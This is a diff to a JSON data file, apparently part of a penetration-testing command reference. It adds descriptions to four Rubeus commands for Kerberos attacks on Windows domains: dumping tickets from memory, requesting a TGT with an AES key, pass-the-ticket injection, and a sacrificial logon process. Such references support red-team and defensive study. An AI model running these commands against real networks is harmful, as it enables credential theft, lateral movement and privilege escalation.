@@ -75,19 +75,23 @@
   "variations": [
     {
       "label": "Dump Tickets",
-      "command": "Rubeus.exe dump /nowrap"
+      "command": "Rubeus.exe dump /nowrap",
+      "description": "Uses Rubeus to dump all Kerberos tickets from memory. Extracts TGTs and TGSs from the current session for reuse in pass-the-ticket attacks."
     },
     {
       "label": "AskTGT (AES256)",
-      "command": "Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes_key> /nowrap"
+      "command": "Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes_key> /nowrap",
+      "description": "Runs a Rubeus operation for Kerberos-based attacks. Rubeus handles ticket manipulation, roasting, and Kerberos abuse from a Windows host."
     },
     {
       "label": "Inject Ticket",
-      "command": "Rubeus.exe ptt /ticket:<ticket>"
+      "command": "Rubeus.exe ptt /ticket:<ticket>",
+      "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
     },
     {
       "label": "Sacrificial Process",
-      "command": "Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show"
+      "command": "Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show",
+      "description": "Uses Rubeus to create a new logon session with a sacrificial process, then injects a Kerberos ticket into it. Creates a clean session for ticket-based access without contaminating your current session."
     }
   ],
   "opsec": "loud",
